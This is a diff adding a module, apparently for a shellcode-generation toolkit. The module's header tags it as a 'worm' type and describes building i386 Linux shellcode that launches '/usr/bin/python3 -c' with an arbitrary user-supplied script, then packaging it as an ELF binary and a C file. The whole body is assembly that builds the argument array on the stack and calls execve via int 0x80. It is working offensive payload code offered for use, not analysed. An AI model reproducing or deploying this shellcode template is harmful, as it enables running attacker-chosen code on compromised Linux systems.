@@ -1,0 +1,39 @@
+#!name##PyShell
+#!types##worm
+#!info##Creates shellcode i386 32bit using stack to call '/usr/bin/python3 -c' along with code as payload. Creates an elf executable file (linux) and a C file with the shellcode.
+#!reqPayload##PY_script##Python Script to execute
+#!banned##module##starter##shadow##junk
+#!lang##asm
+#!processWorm##BasicShell
+#!globalVar##EXTERNAL_SCRIPT##PyShell##Compilation using external modules.
+#!globalVar##COMPILER_NAME##MC_elf32##The name of the compiler to build the executable file.
+#!globalVar##OS_EXEC##linux##Target system executable
+#!system_FLAG##[L]
+
+global _start
+
+section .text
+_start:
+    
+    xor eax, eax        
+    push eax            
+    
+    
+    ; params
+{{PY_script}}
+    mov esi, esp 
+    
+    ; execute
+    push eax            
+{{PYshell_py_path}}
+    mov ebx, esp
+    
+    ; args
+    push eax
+    push esi
+    push ebx
+    mov ecx, esp
+    
+    mov edx, eax
+    mov al, 11
+    int 0x80
